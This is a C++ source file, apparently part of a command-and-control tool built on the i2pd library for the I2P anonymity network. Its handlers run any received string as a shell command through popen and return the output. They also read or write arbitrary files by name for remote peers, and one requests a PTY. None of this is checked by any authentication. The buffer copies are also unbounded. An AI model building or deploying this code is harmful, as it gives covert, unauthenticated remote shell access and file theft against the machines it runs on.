#include "api.h"
#include "Log.h"
#include "Transports.h"
#include "util.h"
#include "I2PRCService.h"
#include "sys/stat.h"

constexpr size_t PACK_CMD_SIZE = 100;

namespace i2p
{
namespace client
{


I2PRCService::~I2PRCService()
{
}



static PACK_CMD_TYPE c2type(uint8_t c)
{
    return (PACK_CMD_TYPE)(c - 48);
}

void I2PRCService::Init(std::shared_ptr<boost::concurrent::sync_queue<packet>> ReceiptRef)
{
    m_ReceiptQueue = ReceiptRef;
}

void I2PRCService::Start()
{
    i2p::api::AcceptStream(m_Dest, std::bind(&I2PRCService::HandleAccept, shared_from_this(), std::placeholders::_1));
}

void I2PRCService::HandleAccept(std::shared_ptr<i2p::stream::Stream> s) {
    uint8_t* buf = (uint8_t*)malloc(PACK_CMD_SIZE);
    s->AsyncReceive(boost::asio::buffer(buf, PACK_CMD_SIZE),
                    [s, buf, this](const boost::system::error_code &ecode,
                                   std::size_t bytes_transferred)
                    {
                        if (bytes_transferred > 0) {
                            auto handler = this->CreateHandler(s, (PACK_CMD_TYPE)(buf[0]));
                            int index = std::string(reinterpret_cast<char*>(buf + 1), bytes_transferred).find_first_of('\\');
                            std::cout << "type: " << (int)(buf[0]) << ", handler msg: " << std::string(reinterpret_cast<char*>(buf + 1), index) << std::endl;
                            handler->Handle(buf + 1, index);
                            free(buf);
                        }
                    });
}



void I2PRCService::Dispatch(std::string hash, packet pack)
{
    auto h = GetHandler(hash, pack.type);
    h->Handle(pack.data, pack.size);
}


void I2PRCService::Receipt(uint8_t type, uint8_t *buf, size_t size)
{
    packet pack;
    pack.type = (PACK_CMD_TYPE)(type);
    memcpy(pack.data, buf, size);
    pack.size = size;
    m_ReceiptQueue->push(pack);
}

static std::string ht2hat(std::string h, PACK_CMD_TYPE t)
{
    return h + std::to_string(t);
}

std::shared_ptr<C2PServiceHandler> I2PRCService::GetHandler(std::string hash, PACK_CMD_TYPE type)
{
    auto h = m_Handlers.find(ht2hat(hash, type));
    if (h != m_Handlers.end())
        return h->second;
    return CreateHandler(hash, type);
}

std::shared_ptr<C2PServiceHandler> I2PRCService::CreateHandler(std::string hash, PACK_CMD_TYPE type)
{
    i2p::data::IdentHash ident;
    ident.FromBase32(hash);
    return CreateHandler(m_Dest->CreateStream(ident), type);
}

std::shared_ptr<C2PServiceHandler> I2PRCService::CreateHandler(std::shared_ptr<i2p::stream::Stream> s, PACK_CMD_TYPE type)
{
    if (!s)
        return nullptr;
    std::cout << "send id : " << s->GetSendStreamID() << "| receive id : " << s->GetRecvStreamID() << std::endl;
    std::shared_ptr<C2PServiceHandler> handler;
    switch (type) {
        case PACK_CMD_TYPE::FILESEND:
            handler = std::make_shared<C2PFileTransSendHandler>(s, shared_from_this());
            break;
        case PACK_CMD_TYPE::FILESAVE:
            handler = std::make_shared<C2PFileTransSaveHandler>(s, shared_from_this());
            break;
        case PACK_CMD_TYPE::EXECRET:
            handler = std::make_shared<C2PCMDHandler>(s, shared_from_this());
            break;
        case PACK_CMD_TYPE::EXEC:
            handler = std::make_shared<C2PAskHandler>(s, shared_from_this());
            break;
        case PACK_CMD_TYPE::INST:
            handler = std::make_shared<C2PInstHandler>(s, shared_from_this());
            break;
        case PACK_CMD_TYPE::FILEDOWNLOAD:
            handler = std::make_shared<C2PFileDownloadHandler>(s, shared_from_this());
            break;
        case PACK_CMD_TYPE::FILEPASSIVESEND:
            handler = std::make_shared<C2PFileTransPassiveSendHandler>(s, shared_from_this());
            break;
        default:
            handler = std::make_shared<C2PMsgHandler>(s, shared_from_this());
            break;
    }
    if (handler) {
        AddHandler(ht2hat(s->GetRemoteIdentity()->GetIdentHash().ToBase32(), type), handler);
    }
    return handler;
}




C2PServiceHandler::C2PServiceHandler(std::shared_ptr<i2p::stream::Stream> s, std::shared_ptr<I2PRCService> owner) : i2p::util::RunnableServiceWithWork("Handler"), m_Stream(s), m_Owner(owner)
{
    StartIOService();
}



void C2PServiceHandler::Done()
{
    m_Owner->RemoveHandler(shared_from_this());
}

C2PServiceHandler::~C2PServiceHandler()
{
    m_Stream->Close();
    StopIOService();
}


void C2PServiceHandler::StreamReceive()
{
    if (m_Stream) {
        if (m_Stream->GetStatus() == i2p::stream::eStreamStatusNew ||
            m_Stream->GetStatus() == i2p::stream::eStreamStatusOpen)  // regular
        {
            m_Stream->AsyncReceive(
                    boost::asio::buffer(m_StreamBuffer,
                                        C2P_BUFFER_SIZE),
                    std::bind(&C2PServiceHandler::HandleStreamReceive,
                              shared_from_this(), std::placeholders::_1,
                              std::placeholders::_2),
                    C2P_CONNECTION_MAX_IDLE);
        } else { // closed by peer

            // get remaining data
            auto len = m_Stream->ReadSome(m_StreamBuffer,
                                          C2P_BUFFER_SIZE);
            if (len > 0)  // still some data
                HandleStreamReceive(boost::system::error_code(), len);
            Done();
        }
    }
}


void C2PServiceHandler::StreamSend(size_t len)
{
    if (!m_Stream || len <= 0)
        return;
    m_Stream->AsyncSend(m_StreamBuffer, len, std::bind(&C2PServiceHandler::HandleStreamSend, shared_from_this(),
                                                           std::placeholders::_1));
    std::cout << "stream send " << len << " bytes" << std::endl;


}
void C2PInstHandler::Handle(uint8_t *buf, size_t size)
{
    PACK_CMD_TYPE pt;
    PACK_CMD_TYPE at;
    std::string s(reinterpret_cast<char*>(buf), size);
    if (s.find('^') != std::string::npos) {
        pt = PACK_CMD_TYPE::FILESAVE;
        at = PACK_CMD_TYPE::FILESEND;
    } else {
        pt = PACK_CMD_TYPE::PTY;
    }
    SendCMD(pt, buf, size);
    m_Owner->CreateHandler(m_Stream, at);
}

void C2PAskHandler::Handle(uint8_t *buf, size_t size)
{
    SendCMD(PACK_CMD_TYPE::EXECRET, buf, size);
    StreamReceive();
}

void C2PMsgHandler::SendCMD(PACK_CMD_TYPE type, uint8_t* cmd, size_t size)
{
    size_t len = std::string(reinterpret_cast<char*>(cmd)).size();
    if (len >= PACK_CMD_SIZE)
        return;
    memset(m_StreamBuffer, '\\', PACK_CMD_SIZE);
    m_StreamBuffer[0] = type;
    memcpy(m_StreamBuffer + 1, cmd, size);
    StreamSend(PACK_CMD_SIZE);
    sleep(1);
}

void C2PMsgHandler::Handle(uint8_t *buf, size_t size)
{
    SendCMD(PACK_CMD_TYPE::MSG, buf, size);
}

void C2PAskHandler::HandleStreamReceive(const boost::system::error_code &ecode,
                             std::size_t bytes_transferred)
{
    std::cout << "return msg: " << std::endl;
    for (int i = 0; i < bytes_transferred; ++i) {
        char c = *(m_StreamBuffer + i);
        std::cout << c;
    }
    std::cout << std::endl;

    m_Owner->Receipt(PACK_CMD_TYPE::MSG, m_StreamBuffer, bytes_transferred);
    Done();
}


void C2PMsgReplyHandler::Handle(uint8_t* buf, size_t size)
{
    m_ReceiveMsg = std::string(reinterpret_cast<char*>(buf), size);
    ReplyMsg();
}

void C2PMsgReplyHandler::ReplyMsg()
{
    int len = GetReply();
    StreamSend(len);
}

int C2PMsgReplyHandler::GetReply()
{
    std::string input;
    std::cin >> input;
    std::strncpy(reinterpret_cast<char*>(m_StreamBuffer), input.c_str(), input.size());
    return input.size();
}

int C2PCMDHandler::GetReply()
{
    memset(reinterpret_cast<char*>(m_StreamBuffer), 0 ,C2P_BUFFER_SIZE);
    auto fp = popen(m_ReceiveMsg.c_str(), "r");
    int c;
    int offset = 0;
    std::cout << "cmd return: " << std::endl;
    while ((c = fgetc(fp)) != EOF) {
        uint8_t r = (uint8_t)(c);
        std::cout << (char)(c);
        *(m_StreamBuffer + offset) = r;
        offset++;
    }
    std::cout << std::endl;
    return offset;
}



void C2PFileDownloadHandler::Handle(uint8_t *buf, size_t size)
{
    SendCMD(PACK_CMD_TYPE::FILEPASSIVESEND, buf, size);
    StreamReceive();
}

void C2PFileDownloadHandler::HandleStreamReceive(const boost::system::error_code &ecode, std::size_t bytes_transferred)
{

    uint32_t offset = 0;
    if (!m_SizeSent) {
        m_Owner->Receipt(PACK_CMD_TYPE::FILESAVE, m_StreamBuffer, 4);
        m_SizeSent = true;
        offset = 4;
        std::cout << "receive filesize: " << bufbe32toh(m_StreamBuffer) << std::endl;
    }
    m_Owner->Receipt(PACK_CMD_TYPE::FILESAVE, m_StreamBuffer + offset, bytes_transferred - offset);
    std::cout << "receipt " << bytes_transferred - offset << " bytes" << std::endl;
    StreamReceive();
}

void C2PFileTransPassiveSendHandler::Handle(uint8_t *buf, size_t size)
{
    std::string filename(reinterpret_cast<char*>(buf), size);
    m_File.open(filename);
    std::cout << "send file: " << filename << std::endl;
    struct stat statbuf;
    stat(filename.c_str(), &statbuf);
    m_FileSize = statbuf.st_size;
    htobe32buf(m_StreamBuffer, statbuf.st_size);
    StreamSend(4);
    std::cout << "send filesize first, filesize: " << statbuf.st_size << std::endl;
}

void C2PFileTransPassiveSendHandler::HandleStreamSend(const boost::system::error_code &ecode)
{
    ReadFromFile();
}

void C2PFileTransPassiveSendHandler::ReadFromFile()
{
    auto oldoffset = m_File.tellg();
    if (oldoffset == -1) {
        std::cout << "done" << std::endl;
        return;
    }
    m_File.read(reinterpret_cast<char*>(m_StreamBuffer), C2P_BUFFER_SIZE);
    auto len = m_File.tellg() - oldoffset;
    if (m_File.tellg() == -1) {
        len = m_FileSize - oldoffset;
    }
    std::cout << "read " << len << "bytes from file" << std::endl;
    StreamSend(len);
}


C2PFileTransSendHandler::~C2PFileTransSendHandler()
{

}

void C2PFileTransSendHandler::Handle(uint8_t* buf, size_t size)
{
    memcpy(m_StreamBuffer, buf, size);
    StreamSend(size);
}


void C2PFileTransSaveHandler::Handle(uint8_t* buf, size_t size)
{
    std::string data(reinterpret_cast<char*>(buf), size);
    std::string filename(data, 0, data.find_first_of('^'));
    m_Filesize = std::stoll(std::string(data, data.find_first_of('^') + 1, data.find_first_of('\\') - data.find_first_of('^')));
    std::cout << "filename: " << filename << std::endl << "filesize: " << m_Filesize << std::endl;
    m_File.open(filename);
    StreamReceive();
}

void C2PFileTransSaveHandler::HandleWritenToFile(size_t size)
{
    m_Filesize -= size;
    if (m_Filesize <= 0) {
        std::cout << "done" << std::endl;
        Done();
        return;
    }
    StreamReceive();
}

void C2PFileTransSaveHandler::HandleStreamReceive(const boost::system::error_code &ecode,
                                                  std::size_t bytes_transferred)
{
    std::cout << "stream receive " << bytes_transferred << " bytes" << std::endl;
    WriteToFile(m_StreamBuffer, bytes_transferred, std::bind(&C2PFileTransSaveHandler::HandleWritenToFile, std::dynamic_pointer_cast<C2PFileTransSaveHandler>(shared_from_this()), std::placeholders::_1));
}

void C2PFileTransSaveHandler::WriteToFile(uint8_t* buf, size_t size, FileHandler handler)
{
    auto oldoffset = m_File.tellp();
    m_File.write(reinterpret_cast<char*>(buf), size);
    auto len = m_File.tellp() - oldoffset;
    std::cout << "write file " << len << " bytes" << std::endl;
    if (handler)
        handler(len);
}


}  // namespace client
}  // namespace i2p
